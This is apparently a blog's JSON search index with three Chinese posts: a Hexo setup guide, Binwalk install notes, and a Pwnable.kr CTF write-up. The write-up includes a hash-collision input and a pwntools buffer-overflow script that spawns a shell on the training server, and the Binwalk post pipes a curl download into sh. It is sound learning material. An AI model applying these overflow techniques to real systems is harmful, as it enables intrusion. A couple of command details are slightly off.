[{"title":"Hexo 博客搭建","url":"/applications/Hexo/Hexo_%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/","content":"Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他标记语言）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。\n\n\n安装应用Hexo 基于 Node.js 开发，需要以下工具支撑运行。\n\nNode.js (Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本)\nGit\n\n通过 npm 安装 Hexo 应用。\nnpm install -g hexo-cli\n\n创建博客新建任意目录，作为 Hexo 博客的根目录。\nmkdir test-blog\n\n初始化 Hexo 博客，新建和下载所需要的文件。\ncd test-bloghexo init\n\n完成之后，目录的基本结构如下所示。\n.├── _config.yml├── package.json├── scaffolds├── source|   ├── _drafts|   └── _posts└── themes\n\n启动 Node.js 内置的服务器，在本地预览博客。\nhexo clean      # 清除缓存文件和已生成的静态文件hexo generate   # 可以缩写成hexo g，生成静态文件。hexo server     # 可以缩写成hexo d，启动服务器。\n\n默认情况下，通过 http://localhost:4000 访问博客。\n\n配置博客Hexo 博客的一些基础配置。\n引用图片默认情况下，可以直接使用 MarkDown 语法在文章中引用本地或者图床中的图片。\n![This is an example image](/images/example.png)![This is an example image](https://xxx.xxx.com/images/example.png)\n\n对于本地图片资源，为了便于组织和管理，可以启用资源目录，将图片与文章放置在一起，通过相对路径进行引用。\n# _config.ymlpost_asset_folder: true\n\n文章与图片的目录结构如下，每篇文章对应一个同名的资源目录。\n_post├── example.md└── example\t└── example.png\n\n使用 MarkDown 语法或者标签插件提供的语法在文章中引用图片。\n![This is an example image](example/example.png)&#123;% asset_img example.png This is an example image %&#125;\n\n在 hexo-renderer-marked 3.1.0 中，引入新的选项，用于简化 MarkDown 引用图片的语句。\n# _config.ymlpost_asset_folder: truemarked:  prependRoot: false  postAsset: true\n\n使用简化的 MarkDown 语法在文章中引用本地图片。\n![This is an example image](example.png)\n\n部署博客Hexo 提供了快速部署功能，可以将博客快速部署到指定服务器。\nGitHub在 GitHub 中新建公共仓库，仓库名必须为 &lt;GitHub用户名&gt;.github.io 格式。\n本地配置 Git 用户信息，并生成 SSH 密钥对。\ngit config --global user.name &quot;&lt;用户名称&gt;&quot;git config --global user.email &quot;&lt;用户邮箱&gt;&quot;ssh-keygen -t rsa -C &quot;&lt;用户邮箱&gt;&quot;\n\n复制 ~/.ssh 目录下 id_rsa.pub 文件中的 SSH 公钥信息，将其添加到 GitHub 设置中。\n\n安装 hexo-deployer-git 插件。\nnpm install hexo-deployer-git --save\n\n编辑 _config.yml 配置文件，修改部署配置。\n# Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy:  type: git  repo: git@github.com:&lt;GitHub用户名&gt;/GitHub用户名&gt;.github.io.git  branch: main\n\n将博客部署到 GitHub 仓库。\nhexo d\n\n等待一段时间后，可以通过 https://&lt;GitHub用户名&gt;.github.io 访问博客。\n参考链接文档 | Hexo\n","categories":["工具应用","Hexo"],"tags":["Hexo"]},{"title":"Binwalk 安装部署","url":"/applications/Binwalk/Binwalk_%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2/","content":"Binwalk 安装记录，基于 Ubuntu Desktop 22.04.4 amd64 环境进行部署。\n\n\nV3安装 Rust 编译环境。\nsudo apt install curlcurl --proto &#x27;=https&#x27; --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y. $HOME/.cargo/env\n\n下载 Binwalk 并安装依赖。\nsudo apt install gitsudo apt install build-essential libfontconfig1-dev liblzma-dev libbz2-dev libssl-devgit clone https://github.com/ReFirmLabs/binwalksudo ./binwalk/dependencies/ubuntu.sh\n\n编译 Binwalk 源码。\ncd binwalkcargo build --releasesudo cp target/release/binwalk /usr/local/bin/\n\nV2安装依赖组件。\nsudo apt updatesudo apt install -y git locales build-essential qtbase5-dev mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsswap squashfs-tools zlib1g-dev liblzma-dev liblzo2-dev sleuthkit default-jdk lzop srecord cpio\n\n安装 Python 依赖。\nsudo python3 -m pip install --upgrade pip setuptools matplotlib capstone pycryptodome gnupg tk\n\n安装 Sasquatch 组件。\nsudo apt updatesudo apt install -y build-essential liblzma-dev liblzo2-dev zlib1g-devgit clone --quiet --depth 1 --branch &quot;master&quot; https://github.com/devttys0/sasquatchcd sasquatchwget https://github.com/devttys0/sasquatch/pull/51.patch &amp;&amp; patch -p1 &lt;51.patchsudo ./build.shcd .. &amp;&amp; sudo rm -rf sasquatch\n\n安装 Yaffshiv 组件。\ngit clone https://github.com/devttys0/yaffshivcd yaffshivsudo python3 setup.py installcd .. &amp;&amp; sudo rm -rf yaffshiv\n\n安装 Yefferson 组件。\ngit clone https://github.com/sviehb/jefferson.gitcd jeffersonsudo apt updatesudo apt install -y liblzo2-devsudo python3 -m pip install -r requirements.txtsudo python3 setup.py installcd .. &amp;&amp; sudo rm -rf jefferson\n\n安装 UBI Reader 组件。\nsudo python3 -m pip install --upgrade ubi_reader\n\n安装 Cramfstools 组件。\ngit clone https://github.com/npitre/cramfs-toolscd cramfs-toolsmakesudo install mkcramfs /usr/local/binsudo install cramfsck /usr/local/bincd .. &amp;&amp; sudo rm -rf cramfs-tools\n\n安装 Binwalk 应用。\ngit clone https://github.com/ReFirmLabs/binwalkcd binwalksudo python3 setup.py install\n\n参考链接Compile From Source · ReFirmLabs&#x2F;binwalk Wiki\n","categories":["工具应用","Binwalk"],"tags":["Binwalk"]},{"title":"Pwnable.kr Toddler's Bottle 练习记录","url":"/cybersecurity/ctf/Pwnable_kr_Toddler_s_Bottle_%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/","content":"Pwnable.kr Toddler&#39;s Bottle 练习记录。\n\n\nfd查看程序源码，需要使 buf 为 &quot;LETMEWIN&quot; 字符串才可以得到 flag 信息。\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123;\tif(argc&lt;2)&#123;\t\tprintf(&quot;pass argv[1] a number\\n&quot;);\t\treturn 0;\t&#125;\tint fd = atoi( argv[1] ) - 0x1234;\tint len = 0;\tlen = read(fd, buf, 32);\tif(!strcmp(&quot;LETMEWIN\\n&quot;, buf))&#123;\t\tprintf(&quot;good job :)\\n&quot;);\t\tsystem(&quot;/bin/cat flag&quot;);\t\texit(0);\t&#125;\tprintf(&quot;learn about Linux file IO\\n&quot;);\treturn 0;&#125;\n\n在 Linux 系统中，文件描述符使用 int 类型进行表示，其中有三个系统默认值。\n\n0：stdin，标准输入流\n1：stdout，标准输出流\n2：stderr，标准错误流\n\n当程序中 fd 的值为 0 时，表示 read() 函数将从 stdin 流中读取 32 字节数据到 buf 数组中，此时可以控制 buf 为 &quot;LETMEWIN&quot; 字符串，得到 flag 信息。\nfd@pwnable:~$ ./fd 4660LETMEWINgood job :)mommy! I think I know what a file descriptor is!!\n\ncollision查看程序源码，当输入的字符相加为 0x21DD09EC 时，得到 flag 信息。\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123;\tint* ip = (int*)p;\tint i;\tint res=0;\tfor(i=0; i&lt;5; i++)&#123;\t\tres += ip[i];\t&#125;\treturn res;&#125;int main(int argc, char* argv[])&#123;\tif(argc&lt;2)&#123;\t\tprintf(&quot;usage : %s [passcode]\\n&quot;, argv[0]);\t\treturn 0;\t&#125;\tif(strlen(argv[1]) != 20)&#123;\t\tprintf(&quot;passcode length should be 20 bytes\\n&quot;);\t\treturn 0;\t&#125;\tif(hashcode == check_password( argv[1] ))&#123;\t\tsystem(&quot;/bin/cat flag&quot;);\t\treturn 0;\t&#125;\telse\t\tprintf(&quot;wrong passcode.\\n&quot;);\treturn 0;&#125;\n\n由 0x21DD09EC 为 568134124 可知，当 0x21DD09EC + 0x1 &#x3D; 0x21DD09ED 时，能够被 5 除尽，所以可以得到 0x6C5CEC9、0x6C5CEC9、0x6C5CEC9、0x6C5CEC9 和 0x6C5CEC8 等 5 个用于相加的数值。\n构造用于输入的字符串，读取 flag 信息。\ncol@pwnable:~$ ./col `python -c &#x27;print &quot;\\xC9\\xCE\\xC5\\x06\\xC9\\xCE\\xC5\\x06\\xC9\\xCE\\xC5\\x06\\xC9\\xCE\\xC5\\x06\\xC8\\xCE\\xC5\\x06&quot;&#x27;`daddy! I just managed to create a hash collision :)\n\nbof查看程序源码，当 key 为 0xcafebabe 时，得到 flag 信息。\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123;\tchar overflowme[32];\tprintf(&quot;overflow me : &quot;);\tgets(overflowme);\t// smash me!\tif(key == 0xcafebabe)&#123;\t\tsystem(&quot;/bin/sh&quot;);\t&#125;\telse&#123;\t\tprintf(&quot;Nah..\\n&quot;);\t&#125;&#125;int main(int argc, char* argv[])&#123;\tfunc(0xdeadbeef);\treturn 0;&#125;\n\n通过 gets() 函数获取输入时，并不会对输入数据的长度进行检查，因此输入长度超过 32 字节便会溢出 overflowme 数组的内存空间。\n查看 func 函数的栈布局。\n-0000002C overflowme db 32 dup(?)-0000000C var_C dd ?-00000008 db ? ; undefined-00000007 db ? ; undefined-00000006 db ? ; undefined-00000005 db ? ; undefined-00000004 db ? ; undefined-00000003 db ? ; undefined-00000002 db ? ; undefined-00000001 db ? ; undefined+00000000  s db 4 dup(?)+00000004  r db 4 dup(?)+00000008 key dd ?+0000000C+0000000C ; end of stack variables\n\n其中 overflowme 距离 key 偏移为 0x34 字节，当填充 56 字节的数据时，便可以覆盖 key 的值。\n编写利用脚本。\n#!/usr/bin/python3from pwn import *payload = b&#x27;A&#x27; * 0x34payload += b&#x27;\\xbe\\xba\\xfe\\xca&#x27;target = remote(&#x27;pwnable.kr&#x27;, 9000)target.sendline(payload)target.interactive()\n\n运行脚本，得到 flag 信息。\n\n参考链接pwnable.kr\n","categories":["网络安全","CTF"],"tags":["CTF"]}]